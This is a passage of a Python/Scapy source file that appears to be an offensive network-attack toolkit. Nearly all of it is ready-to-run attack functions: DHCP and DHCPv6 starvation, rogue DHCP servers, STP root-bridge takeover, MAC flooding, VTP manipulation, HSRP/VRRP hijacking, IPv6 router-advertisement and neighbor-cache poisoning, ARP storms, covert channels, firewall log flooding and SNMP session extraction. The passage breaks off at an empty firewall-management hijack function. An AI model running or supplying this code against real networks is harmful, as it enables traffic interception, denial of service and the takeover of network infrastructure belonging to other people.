    # Set desired trunk negotiation state
    if desired_state == "dynamic_desirable":
        dtp_packet[Raw].load = bytes.fromhex("0003000100040003")
    elif desired_state == "trunk":
        dtp_packet[Raw].load = bytes.fromhex("0005000100040005")
    
    sendp(dtp_packet, iface=iface, loop=1, inter=2, verbose=False)
    l2_attacks_active['dtp'] = True
    print(f"[DTP] Sending trunk negotiation packets to {target_mac}")

def dhcp_starvation_attack(iface, network="192.168.1.0/24"):
    """
    Flood DHCP server with requests to exhaust IP pool
    """
    print(f"[DHCP] Starting starvation attack on network {network}")
    
    our_mac = get_if_hwaddr(iface)
    network_obj = ipaddress.ip_network(network)
    
    def send_dhcp_request():
        while l2_attacks_active.get('dhcp_starvation', False):
            try:
                # Spoof MAC address for each request
                spoofed_mac = f"00:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}"
                
                dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=spoofed_mac)/ \
                              IP(src="0.0.0.0", dst="255.255.255.255")/ \
                              UDP(sport=68, dport=67)/ \
                              BOOTP(chaddr=binascii.unhexlify(spoofed_mac.replace(":", "")))/ \
                              DHCP(options=[("message-type", "discover"), "end"])
                
                sendp(dhcp_discover, iface=iface, verbose=False)
                time.sleep(0.01)
            except Exception as e:
                print(f"[DHCP] Error in starvation attack: {e}")
                break
    
    l2_attacks_active['dhcp_starvation'] = True
    threading.Thread(target=send_dhcp_request, daemon=True).start()
    print("[DHCP] starvation attack started")

def rogue_dhcp_server(iface, pool_start="192.168.1.100", pool_end="192.168.1.200", 
                     router="192.168.1.1", dns_server="8.8.8.8", domain="evil.com"):
    """
    Set up a rogue DHCP server
    """
    print(f"[DHCP] Starting rogue server on {iface}")
    
    def handle_dhcp(pkt):
        if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
            # Craft DHCP Offer
            offer = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(iface))/ \
                   IP(src=router, dst="255.255.255.255")/ \
                   UDP(sport=67, dport=68)/ \
                   BOOTP(op=2, xid=pkt[BOOTP].xid, yiaddr=pool_start, 
                         chaddr=pkt[BOOTP].chaddr)/ \
                   DHCP(options=[("message-type", "offer"),
                                ("server_id", router),
                                ("lease_time", 86400),
                                ("router", router),
                                ("name_server", dns_server),
                                ("domain", domain),
                                "end"])
            sendp(offer, iface=iface, verbose=False)
            
        elif pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 3:  # DHCP Request
            # Craft DHCP ACK
            ack = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(iface))/ \
                 IP(src=router, dst="255.255.255.255")/ \
                 UDP(sport=67, dport=68)/ \
                 BOOTP(op=2, xid=pkt[BOOTP].xid, yiaddr=pool_start, 
                       chaddr=pkt[BOOTP].chaddr)/ \
                 DHCP(options=[("message-type", "ack"),
                              ("server_id", router),
                              ("lease_time", 86400),
                              ("router", router),
                              ("name_server", dns_server),
                              ("domain", domain),
                              "end"])
            sendp(ack, iface=iface, verbose=False)
    
    l2_attacks_active['rogue_dhcp'] = True
    sniff(iface=iface, filter="udp and (port 67 or 68)", prn=handle_dhcp, store=False)
    print("[DHCP] Rogue server started")

def stp_root_bridge_attack(iface, priority=0):
    """
    Become the root bridge in STP topology
    """
    print(f"[STP] Attempting root bridge takeover with priority {priority}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Craft superior BPDU
    stp_packet = Ether(dst="01:80:c2:00:00:00", src=our_mac)/ \
                LLC(dsap=0x42, ssap=0x42, ctrl=3)/ \
                STP(bpdutype=0x00, bpduflags=0x01, rootid=priority, 
                    rootmac=our_mac, bridgeid=priority, bridgemac=our_mac,
                    portid=0x8001, age=0, maxage=20, hellotime=2, 
                    forwarddelay=15)
    
    sendp(stp_packet, iface=iface, loop=1, inter=2, verbose=False)
    l2_attacks_active['stp'] = True
    print("[STP] Root bridge attack started")

def cdp_lldp_spoofing(iface, device_id="CiscoSwitch", platform="Cisco IOS", 
                     capabilities="Switch", ip_address="192.168.1.1"):
    """
    Spoof CDP or LLDP advertisements
    """
    print(f"[CDP/LLDP] Spoofing as {device_id} on {iface}")
    
    our_mac = get_if_hwaddr(iface)
    
    # CDP Spoofing
    cdp_packet = Ether(dst="01:00:0c:cc:cc:cc", src=our_mac)/ \
                LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                SNAP(OUI=0x00000c, code=0x2000)/ \
                Raw(load=bytes.fromhex("0002000b00000001000100340002000f") + 
                    device_id.encode() + 
                    bytes.fromhex("0003000c00000001000100050004000c") + 
                    platform.encode() + 
                    bytes.fromhex("00050004000000010001000800060008") + 
                    capabilities.encode() + 
                    bytes.fromhex("0008000b00000001000100020009000c") + 
                    ip_address.encode())
    
    # LLDP Spoofing
    lldp_packet = Ether(dst="01:80:c2:00:00:0e", src=our_mac)/ \
                 LLDPDU()
    
    sendp(cdp_packet, iface=iface, loop=1, inter=5, verbose=False)
    sendp(lldp_packet, iface=iface, loop=1, inter=5, verbose=False)
    l2_attacks_active['cdp_lldp'] = True
    print("[CDP/LLDP] Spoofing attack started")

def mac_flooding(iface, count=100000):
    """
    Flood switch with MAC addresses to exhaust CAM table
    """
    print(f"[MAC] Flooding switch CAM table on {iface}")
    
    our_mac = get_if_hwaddr(iface)
    
    for i in range(count):
        if not l2_attacks_active.get('mac_flood', True):
            break
            
        spoofed_mac = f"00:{(i // 256 % 256):02x}:{(i % 256):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}"
        
        flood_packet = Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff")/ \
                      IP(src="192.168.1.1", dst="255.255.255.255")/ \
                      UDP()/Raw(load="X"*100)
        
        sendp(flood_packet, iface=iface, verbose=False)
        
        if i % 1000 == 0:
            print(f"[MAC] Sent {i} packets")
    
    l2_attacks_active['mac_flood'] = False
    print("[MAC] Flooding completed")

def eapol_bypass(iface, target_mac):
    """
    Bypass 802.1X authentication using EAPOL attacks
    """
    print(f"[802.1X] Attempting EAPOL bypass for {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    
    # EAPOL Start packet
    eapol_start = Ether(dst=target_mac, src=our_mac)/ \
                 EAPOL(version=1, type=0x01)  # EAPOL-Start
    
    # EAPOL Logoff packet (to force reauthentication)
    eapol_logoff = Ether(dst=target_mac, src=our_mac)/ \
                  EAPOL(version=1, type=0x02)  # EAPOL-Logoff
    
    sendp(eapol_start, iface=iface, count=5, inter=0.5, verbose=False)
    sendp(eapol_logoff, iface=iface, count=5, inter=0.5, verbose=False)
    
    print("[802.1X] EAPOL bypass attempted")

def bpdu_injection(iface, target_vlan=1):
    """
    Inject malicious BPDU packets
    """
    print(f"[BPDU] Injecting BPDUs on VLAN {target_vlan}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Malicious BPDU with TCN (Topology Change Notification)
    bpdu_tcn = Ether(dst="01:80:c2:00:00:00", src=our_mac)/ \
              Dot1Q(vlan=target_vlan)/ \
              LLC(dsap=0x42, ssap=0x42, ctrl=3)/ \
              STP(bpdutype=0x80, bpduflags=0x01)  # TCN BPDU
    
    sendp(bpdu_tcn, iface=iface, loop=1, inter=1, verbose=False)
    l2_attacks_active['bpdu'] = True
    print("[BPDU] Injection started")

def vtp_manipulation(iface, domain="EVIL_DOMAIN", revision=1000):
    """
    Manipulate VTP to add/remove VLANs
    """
    print(f"[VTP] Manipulating VTP with domain {domain}, revision {revision}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Craft VTP packet with high revision number
    vtp_packet = Ether(dst="01:00:0c:cc:cc:cc", src=our_mac)/ \
                LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                SNAP(OUI=0x00000c, code=0x2003)/ \
                Raw(load=bytes.fromhex("03010001") + 
                    chr(len(domain)).encode() + domain.encode() + 
                    revision.to_bytes(4, 'big') + 
                    bytes.fromhex("000000010005000102030405"))
    
    sendp(vtp_packet, iface=iface, count=10, inter=0.5, verbose=False)
    print("[VTP] Manipulation attempted")

def icmp_redirect_injection(iface, target_ip, gateway_ip, redirect_ip):
    """
    Inject ICMP redirect packets to manipulate routing
    """
    print(f"[ICMP] Redirecting {target_ip} via {redirect_ip}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Craft ICMP redirect
    icmp_redirect = Ether()/ \
                   IP(src=gateway_ip, dst=target_ip)/ \
                   ICMP(type=5, code=1, gw=redirect_ip)/ \
                   IP(src=target_ip, dst="8.8.8.8", ttl=64)/ \
                   UDP()
    
    sendp(icmp_redirect, iface=iface, count=10, inter=1, verbose=False)
    print("[ICMP] Redirect injection completed")

def arp_storm_generator(iface, network="192.168.1.0/24"):
    """
    Generate ARP storms to disrupt network
    """
    print(f"[ARP] Generating storm on network {network}")
    
    our_mac = get_if_hwaddr(iface)
    network_obj = ipaddress.ip_network(network)
    
    def generate_arp_storm():
        while l2_attacks_active.get('arp_storm', False):
            try:
                for ip in network_obj.hosts():
                    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/ \
                                ARP(op=1, psrc="0.0.0.0", pdst=str(ip), 
                                    hwsrc=our_mac, hwdst="ff:ff:ff:ff:ff:ff")
                    
                    sendp(arp_request, iface=iface, verbose=False)
                    time.sleep(0.001)
            except Exception as e:
                print(f"[ARP] Error in storm generation: {e}")
                break
    
    l2_attacks_active['arp_storm'] = True
    threading.Thread(target=generate_arp_storm, daemon=True).start()
    print("[ARP] Storm generation started")

def gratuitous_arp_flood(iface, spoof_ip, target_network="192.168.1.0/24"):
    """
    Flood network with gratuitous ARP responses
    """
    print(f"[GARP] Flooding with spoofed ARP for {spoof_ip}")
    
    our_mac = get_if_hwaddr(iface)
    network_obj = ipaddress.ip_network(target_network)
    
    # Gratuitous ARP - announce our MAC for the spoofed IP
    garp = Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/ \
          ARP(op=2, psrc=spoof_ip, pdst=spoof_ip, 
              hwsrc=our_mac, hwdst="ff:ff:ff:ff:ff:ff")
    
    sendp(garp, iface=iface, loop=1, inter=0.1, verbose=False)
    l2_attacks_active['garp'] = True
    print("[GARP] Flooding started")

def dhcp_inform_spoofing(iface, target_ip, spoof_server="192.168.1.1"):
    """
    Send DHCP inform packets to gather information or cause disruption
    """
    print(f"[DHCP] Sending inform packets to {target_ip} spoofing {spoof_server}")
    
    our_mac = get_if_hwaddr(iface)
    
    # DHCP inform packet
    dhcp_inform = Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/ \
                 IP(src=target_ip, dst="255.255.255.255")/ \
                 UDP(sport=68, dport=67)/ \
                 BOOTP(ciaddr=target_ip, chaddr=binascii.unhexlify(our_mac.replace(":", "")))/ \
                 DHCP(options=[("message-type", "inform"), 
                              ("server_id", spoof_server),
                              "end"])
    
    sendp(dhcp_inform, iface=iface, count=10, inter=1, verbose=False)
    print("[DHCP] Inform spoofing completed")

def hsrp_vrrp_hijacking(iface, vip="192.168.1.1", group=1, priority=255, 
                       auth="cisco", protocol="hsrp"):
    """
    Hijack HSRP or VRRP groups
    """
    print(f"[HSRP/VRRP] Hijacking {protocol} group {group} for VIP {vip}")
    
    our_mac = get_if_hwaddr(iface)
    
    if protocol.lower() == "hsrp":
        # HSRP packet
        hsrp_packet = Ether(dst="01:00:5e:00:00:02", src=our_mac)/ \
                     IP(src=vip, dst="224.0.0.2")/ \
                     UDP(sport=1985, dport=1985)/ \
                     HSRP(group=group, priority=priority, 
                          auth=auth, virtualIP=vip)
        
        sendp(hsrp_packet, iface=iface, loop=1, inter=1, verbose=False)
        
    elif protocol.lower() == "vrrp":
        # VRRP packet
        vrrp_packet = Ether(dst="01:00:5e:00:00:12", src=our_mac)/ \
                     IP(src=vip, dst="224.0.0.18")/ \
                     VRRP(vrid=group, priority=priority, 
                          ipcount=1, addrlist=[vip])
        
        sendp(vrrp_packet, iface=iface, loop=1, inter=1, verbose=False)
    
    l2_attacks_active['hsrp_vrrp'] = True
    print(f"[HSRP/VRRP] {protocol.upper()} hijacking started")

def pppoe_session_hijacking(iface, session_id, target_mac):
    """
    Hijack PPPoE sessions
    """
    print(f"[PPPoE] Attempting to hijack session {session_id} for {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    
    # PPPoE Active Discovery Initiation (PADI)
    padi_packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=our_mac)/ \
                 PPPoE(code=0x09, sessionid=0x0000)/ \
                 Raw(load=bytes.fromhex("010100000000"))
    
    # PPPoE Active Discovery Offer (PADO)
    pado_packet = Ether(dst=target_mac, src=our_mac)/ \
                 PPPoE(code=0x07, sessionid=0x0000)/ \
                 Raw(load=bytes.fromhex("010100000000020200000000"))
    
    sendp(padi_packet, iface=iface, count=5, inter=0.5, verbose=False)
    sendp(pado_packet, iface=iface, count=5, inter=0.5, verbose=False)
    print("[PPPoE] Session hijacking attempted")

def port_security_violation(iface, target_mac):
    """
    Trigger port security violations
    """
    print(f"[PortSecurity] Triggering violations against {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Flood with different MAC addresses to trigger port security
    for i in range(1000):
        spoofed_mac = f"00:{(i // 256 % 256):02x}:{(i % 256):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}"
        
        violation_packet = Ether(src=spoofed_mac, dst=target_mac)/ \
                          IP()/ICMP()
        
        sendp(violation_packet, iface=iface, verbose=False)
        
        if i % 100 == 0:
            print(f"[PortSecurity] Sent {i} violation packets")
    
    print("[PortSecurity] Violation attack completed")

def loopback_flood_attack(iface):
    """
    Create switching loops to cause broadcast storms
    """
    print(f"[Loopback] Creating switching loop on {iface}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Craft packet that might create a loop
    loop_packet = Ether(src=our_mac, dst="ff:ff:ff:ff:ff:ff")/ \
                 Dot1Q(vlan=1)/ \
                 Dot1Q(vlan=1)/  \
                 IP(src="192.168.1.1", dst="255.255.255.255")/ \
                 UDP()/Raw(load="LOOP"*100)
    
    sendp(loop_packet, iface=iface, loop=1, inter=0.01, verbose=False)
    l2_attacks_active['loopback'] = True
    print("[Loopback] Flood attack started")

def etherchannel_spoofing(iface, target_mac, protocol="pagp"):
    """
    Spoof EtherChannel negotiation protocols
    """
    print(f"[EtherChannel] Spoofing {protocol} to {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    
    if protocol.lower() == "pagp":
        # PAgP packet
        pagp_packet = Ether(dst=target_mac, src=our_mac)/ \
                     LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/ \
                     SNAP(OUI=0x00000c, code=0x0004)/ \
                     Raw(load=bytes.fromhex("0001000100000000"))
        
        sendp(pagp_packet, iface=iface, loop=1, inter=2, verbose=False)
        
    elif protocol.lower() == "lacp":
        # LACP packet
        lacp_packet = Ether(dst="01:80:c2:00:00:02", src=our_mac)/ \
                     LACP(actor_system=our_mac, actor_key=1, 
                          partner_system=target_mac, partner_key=1)
        
        sendp(lacp_packet, iface=iface, loop=1, inter=2, verbose=False)
    
    l2_attacks_active['etherchannel'] = True
    print(f"[EtherChannel] {protocol.upper()} spoofing started")

def qinq_vlan_abuse(iface, inner_vlan=100, outer_vlan=200):
    """
    Abuse QinQ (802.1ad) VLAN tagging
    """
    print(f"[QinQ] Abusing double tagging with inner {inner_vlan}, outer {outer_vlan}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Double tagged packet
    qinq_packet = Ether(src=our_mac, dst="ff:ff:ff:ff:ff:ff")/ \
                 Dot1AD(vlan=outer_vlan)/ \
                 Dot1Q(vlan=inner_vlan)/ \
                 IP(src="192.168.1.1", dst="255.255.255.255")/ \
                 UDP()/Raw(load="QINQ"*50)
    
    sendp(qinq_packet, iface=iface, count=100, inter=0.1, verbose=False)
    print("[QinQ] Double tagging attack completed")

def ipv6_router_advertisement_spoofing(iface, prefix="2001:db8:1::/64"):
    """
    Spoof IPv6 Router Advertisements
    """
    print(f"[IPv6] Spoofing RA with prefix {prefix}")
    
    our_mac = get_if_hwaddr(iface)
    our_ipv6 = "fe80::" + our_mac.replace(":", "")[:8] + ":" + our_mac.replace(":", "")[8:]
    
    # IPv6 Router Advertisement
    ra_packet = Ether(src=our_mac, dst="33:33:00:00:00:01")/ \
               IPv6(src=our_ipv6, dst="ff02::1")/ \
               ICMPv6ND_RA()/ \
               ICMPv6NDOptSrcLLAddr(lladdr=our_mac)/ \
               ICMPv6NDOptMTU()/ \
               ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=64)
    
    sendp(ra_packet, iface=iface, loop=1, inter=5, verbose=False)
    l2_attacks_active['ipv6_ra'] = True
    print("[IPv6] RA spoofing started")

def ipv6_dhcpv6_rogue_server(iface, prefix="2001:db8:1::/64", dns_server="2001:4860:4860::8888"):
    """
    Set up a rogue DHCPv6 server
    """
    print(f"[DHCPv6] Starting rogue server with prefix {prefix}")
    
    our_mac = get_if_hwaddr(iface)
    our_ipv6 = "fe80::" + our_mac.replace(":", "")[:8] + ":" + our_mac.replace(":", "")[8:]
    
    def handle_dhcpv6(pkt):
        if pkt.haslayer(DHCP6_Solicit):
            # Craft DHCPv6 Advertise
            advertise = Ether(src=our_mac, dst=pkt[Ether].src)/ \
                       IPv6(src=our_ipv6, dst=pkt[IPv6].src)/ \
                       UDP(sport=547, dport=546)/ \
                       DHCP6_Advertise()/ \
                       DHCP6OptServerId()/ \
                       DHCP6OptIA_NA()/ \
                       DHCP6OptIAAddress(addr=prefix[:-3] + "100")/ \
                       DHCP6OptDNSServers(dnsservers=[dns_server])
            
            sendp(advertise, iface=iface, verbose=False)
            
        elif pkt.haslayer(DHCP6_Request):
            # Craft DHCPv6 Reply
            reply = Ether(src=our_mac, dst=pkt[Ether].src)/ \
                   IPv6(src=our_ipv6, dst=pkt[IPv6].src)/ \
                   UDP(sport=547, dport=546)/ \
                   DHCP6_Reply()/ \
                   DHCP6OptServerId()/ \
                   DHCP6OptIA_NA()/ \
                   DHCP6OptIAAddress(addr=prefix[:-3] + "100")/ \
                   DHCP6OptDNSServers(dnsservers=[dns_server])
            
            sendp(reply, iface=iface, verbose=False)
    
    l2_attacks_active['dhcpv6_rogue'] = True
    sniff(iface=iface, filter="ip6 and udp port 546", prn=handle_dhcpv6, store=False)
    print("[DHCPv6] Rogue server started")

def nd_spoofing(iface, target_ipv6, spoof_ipv6):
    """
    Spoof IPv6 Neighbor Discovery messages
    """
    print(f"[ND] Spoofing {target_ipv6} to point to {spoof_ipv6}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Neighbor Advertisement spoofing
    na_packet = Ether(src=our_mac, dst="33:33:00:00:00:01")/ \
               IPv6(src=spoof_ipv6, dst="ff02::1")/ \
               ICMPv6ND_NA(tgt=spoof_ipv6, R=0)/ \
               ICMPv6NDOptDstLLAddr(lladdr=our_mac)
    
    sendp(na_packet, iface=iface, count=10, inter=1, verbose=False)
    print("[ND] Spoofing completed")

def nd_cache_poisoning(iface, target_ipv6, target_mac):
    """
    Poison IPv6 neighbor cache
    """
    print(f"[ND] Poisoning cache for {target_ipv6} -> {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Send unsolicited Neighbor Advertisement
    na_packet = Ether(src=our_mac, dst=target_mac)/ \
               IPv6(src=target_ipv6, dst=target_ipv6)/ \
               ICMPv6ND_NA(tgt=target_ipv6, R=0)/ \
               ICMPv6NDOptDstLLAddr(lladdr=our_mac)  # Poison with our MAC
    
    sendp(na_packet, iface=iface, count=10, inter=0.5, verbose=False)
    print("[ND] Cache poisoning completed")

def dhcpv6_starvation(iface):
    """
    Starve DHCPv6 server of addresses
    """
    print("[DHCPv6] Starting starvation attack")
    
    our_mac = get_if_hwaddr(iface)
    
    def send_dhcpv6_solicit():
        while l2_attacks_active.get('dhcpv6_starvation', False):
            try:
                # Generate random IPv6 address for DUID
                duid = binascii.unhexlify("00030001" + our_mac.replace(":", ""))
                
                solicit = Ether(src=our_mac, dst="33:33:00:01:00:02")/ \
                         IPv6(src="::", dst="ff02::1:2")/ \
                         UDP(sport=546, dport=547)/ \
                         DHCP6_Solicit()/ \
                         DHCP6OptClientId(duid=duid)/ \
                         DHCP6OptIA_NA()
                
                sendp(solicit, iface=iface, verbose=False)
                time.sleep(0.1)
            except Exception as e:
                print(f"[DHCPv6] Error in starvation attack: {e}")
                break
    
    l2_attacks_active['dhcpv6_starvation'] = True
    threading.Thread(target=send_dhcpv6_solicit, daemon=True).start()
    print("[DHCPv6] Starvation attack started")

def eapol_fake_supplicant_flood(iface, target_mac):
    """
    Flood with fake 802.1X supplicants
    """
    print(f"[802.1X] Flooding with fake supplicants to {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    
    for i in range(1000):
        spoofed_mac = f"00:{(i // 256 % 256):02x}:{(i % 256):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}:{(random.randint(0, 255)):02x}"
        
        # EAPOL Start from fake supplicant
        eapol_start = Ether(dst=target_mac, src=spoofed_mac)/ \
                     EAPOL(version=1, type=0x01)
        
        sendp(eapol_start, iface=iface, verbose=False)
        
        if i % 100 == 0:
            print(f"[802.1X] Sent {i} fake supplicant packets")
    
    print("[802.1X] Fake supplicant flood completed")

def lacp_spoofing(iface, system_id="00:00:00:00:00:01", key=1, partner_system="00:00:00:00:00:02"):
    """
    Spoof LACP packets to manipulate EtherChannel
    """
    print(f"[LACP] Spoofing with system ID {system_id}")
    
    our_mac = get_if_hwaddr(iface)
    
    # LACP packet
    lacp_packet = Ether(dst="01:80:c2:00:00:02", src=our_mac)/ \
                 LACP(actor_system=system_id, actor_key=key,
                      partner_system=partner_system, partner_key=key,
                      actor_state=0x3d, partner_state=0x3d)  # Active, in sync
    
    sendp(lacp_packet, iface=iface, loop=1, inter=1, verbose=False)
    l2_attacks_active['lacp'] = True
    print("[LACP] Spoofing started")

def custom_ethertype_covert_channel(iface, ethertype=0x8888, payload="SECRET"):
    """
    Create covert channel using custom EtherType
    """
    print(f"[Covert] Creating channel with EtherType 0x{ethertype:04x}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Custom EtherType packet
    covert_packet = Ether(src=our_mac, dst="ff:ff:ff:ff:ff:ff", type=ethertype)/ \
                   Raw(load=payload.encode())
    
    sendp(covert_packet, iface=iface, loop=1, inter=2, verbose=False)
    l2_attacks_active['covert'] = True
    print("[Covert] Channel created")

def ethernet_frame_padding_exploit(iface, target_mac, padding_size=1000):
    """
    Exploit Ethernet frame padding for data exfiltration
    """
    print(f"[Padding] Exploiting frame padding to {target_mac}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Packet with large padding containing hidden data
    hidden_data = base64.b64encode("EXFILTRATED_DATA".encode()).decode()
    padding = hidden_data + "X" * (padding_size - len(hidden_data))
    
    padding_packet = Ether(src=our_mac, dst=target_mac)/ \
                    IP()/ICMP()/ \
                    Raw(load=padding)
    
    sendp(padding_packet, iface=iface, count=10, inter=1, verbose=False)
    print("[Padding] Frame padding exploit completed")

def igmp_snooping_abuse(iface, multicast_group="224.0.0.1"):
    """
    Abuse IGMP snooping to redirect multicast traffic
    """
    print(f"[IGMP] Abusing snooping for group {multicast_group}")
    
    our_mac = get_if_hwaddr(iface)
    multicast_mac = "01:00:5e:" + ":".join([f"{int(x):02x}" for x in multicast_group.split(".")[1:4]])
    
    # IGMP Membership Report
    igmp_report = Ether(src=our_mac, dst=multicast_mac)/ \
                 IP(src="192.168.1.100", dst=multicast_group)/ \
                 IGMP(type=0x16, gaddr=multicast_group)  # V2 Report
    
    sendp(igmp_report, iface=iface, loop=1, inter=10, verbose=False)
    l2_attacks_active['igmp'] = True
    print("[IGMP] Snooping abuse started")

def mld_spoofing(iface, multicast_group="ff02::1"):
    """
    Spoof MLD (Multicast Listener Discovery) for IPv6
    """
    print(f"[MLD] Spoofing for IPv6 group {multicast_group}")
    
    our_mac = get_if_hwaddr(iface)
    our_ipv6 = "fe80::" + our_mac.replace(":", "")[:8] + ":" + our_mac.replace(":", "")[8:]
    
    # MLD Report
    mld_report = Ether(src=our_mac, dst="33:33:00:00:00:01")/ \
                IPv6(src=our_ipv6, dst=multicast_group)/ \
                ICMPv6MLReport()/ \
                ICMPv6MLDMultAddrRec(type=1, addr=multicast_group)
    
    sendp(mld_report, iface=iface, loop=1, inter=10, verbose=False)
    l2_attacks_active['mld'] = True
    print("[MLD] Spoofing started")

# Firewall attack functions
def firewall_session_extraction(iface, target_ip, community="public"):
    """
    Extract firewall session table via SNMP
    """
    print(f"[Firewall] Attempting session table extraction from {target_ip}")
    
    try:
        # Try SNMP walk for session table
        result = subprocess.run([
            'snmpwalk', '-v', '2c', '-c', community, target_ip, 
            '1.3.6.1.4.1.9.9.246.1.3.1.1'
        ], capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            print("[Firewall] Session table extracted via SNMP:")
            for line in result.stdout.split('\n'):
                if "Hex-STRING" in line:
                    print(f"  {line.strip()}")
            return True
        else:
            print("[Firewall] SNMP session extraction failed")
            
    except Exception as e:
        print(f"[Firewall] Session extraction error: {e}")
    
    return False

def firewall_admin_tracking(iface, target_ip, community="public"):
    """
    Track firewall admin login sessions via SNMP traps
    """
    print(f"[Firewall] Tracking admin sessions on {target_ip}")
    
    try:
        # Monitor SNMP traps for admin logins
        result = subprocess.run([
            'snmptrap', '-v', '2c', '-c', community, target_ip, '',
            '1.3.6.1.6.3.1.1.5.3', 'ifIndex', 'i', '1', 
            'ifAdminStatus', 'i', '1'
        ], capture_output=True, text=True, timeout=10)
        
        print("[Firewall] Admin tracking initiated")
        return True
        
    except Exception as e:
        print(f"[Firewall] Admin tracking error: {e}")
    
    return False

def firewall_log_flood(iface, target_ip):
    """
    Flood firewall logs to blind logging
    """
    print(f"[Firewall] Flooding logs on {target_ip}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Generate various log-worthy events
    for i in range(1000):
        # Random source IP
        src_ip = f"10.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        # Various types of traffic to generate logs
        protocols = [
            lambda: IP(src=src_ip, dst=target_ip)/TCP(dport=80, flags="S"),
            lambda: IP(src=src_ip, dst=target_ip)/TCP(dport=443, flags="S"),
            lambda: IP(src=src_ip, dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com")),
            lambda: IP(src=src_ip, dst=target_ip)/ICMP(type=8, code=0),
        ]
        
        packet = random.choice(protocols)()
        sendp(Ether(src=our_mac)/packet, iface=iface, verbose=False)
        
        if i % 100 == 0:
            print(f"[Firewall] Sent {i} log-generating packets")
    
    print("[Firewall] Log flood completed")

def firewall_failover_test(iface, target_ip):
    """
    Simulate failover to trigger config leak
    """
    print(f"[Firewall] Simulating failover on {target_ip}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Send packets that might trigger failover behavior
    failover_packets = [
        # High priority traffic that might trigger failover
        Ether(src=our_mac)/IP(src="192.168.1.100", dst=target_ip)/TCP(dport=22, flags="S"),
        Ether(src=our_mac)/IP(src="192.168.1.100", dst=target_ip)/TCP(dport=23, flags="S"),
        Ether(src=our_mac)/IP(src="192.168.1.100", dst=target_ip)/UDP(dport=161),
    ]
    
    for i, packet in enumerate(failover_packets):
        sendp(packet, iface=iface, count=10, inter=0.1, verbose=False)
        print(f"[Firewall] Sent failover test packet {i+1}")
    
    print("[Firewall] Failover test completed")

def firewall_policy_cloning(iface, target_ip):
    """
    Clone firewall policies via captured ACL responses
    """
    print(f"[Firewall] Attempting policy cloning from {target_ip}")
    
    # Sniff for ACL responses
    def handle_acl_response(pkt):
        if pkt.haslayer(TCP) and (pkt[TCP].dport == 80 or pkt[TCP].dport == 443):
            if pkt.haslayer(Raw) and any(term in pkt[Raw].load.decode('utf-8', errors='ignore') 
                                       for term in ['deny', 'permit', 'access-list']):
                print(f"[Firewall] ACL response detected: {pkt.summary()}")
                captured_packets.append(pkt)
    
    print("[Firewall] Listening for ACL responses...")
    sniff(iface=iface, filter=f"host {target_ip} and tcp port 80 or tcp port 443", 
          prn=handle_acl_response, timeout=30, store=False)
    
    print("[Firewall] Policy cloning attempt completed")

def firewall_vlan_bypass(iface, target_ip, inner_vlan=100, outer_vlan=200):
    """
    Bypass inter-VLAN ACLs via tunneling
    """
    print(f"[Firewall] Bypassing VLAN ACLs via tunneling")
    
    our_mac = get_if_hwaddr(iface)
    
    # Create tunneled packet to bypass ACLs
    tunneled_packet = Ether(src=our_mac, dst="ff:ff:ff:ff:ff:ff")/ \
                     Dot1Q(vlan=outer_vlan)/ \
                     Dot1Q(vlan=inner_vlan)/ \
                     IP(src="192.168.1.100", dst=target_ip)/ \
                     TCP(dport=80, flags="S")
    
    sendp(tunneled_packet, iface=iface, count=10, inter=0.5, verbose=False)
    print("[Firewall] VLAN bypass attempt completed")

def firewall_nat_extraction(iface, target_ip):
    """
    Extract NAT translation tables via TCP timestamp correlation
    """
    print(f"[Firewall] Attempting NAT table extraction from {target_ip}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Send packets with specific TCP timestamps to correlate NAT entries
    for i in range(100):
        src_port = random.randint(1024, 65535)
        timestamp = int(time.time())
        
        probe_packet = Ether(src=our_mac)/ \
                      IP(src="192.168.1.100", dst=target_ip)/ \
                      TCP(sport=src_port, dport=80, flags="S", 
                          options=[('Timestamp', (timestamp, 0))])
        
        sendp(probe_packet, iface=iface, verbose=False)
        time.sleep(0.01)
    
    print("[Firewall] NAT extraction probes sent")
    print("[Firewall] Analyze responses to correlate NAT translations")

def firewall_mgmt_hijack(iface, target_ip, gateway_ip):
    """
    Hijack firewall management interface via ARP poisoning
    """
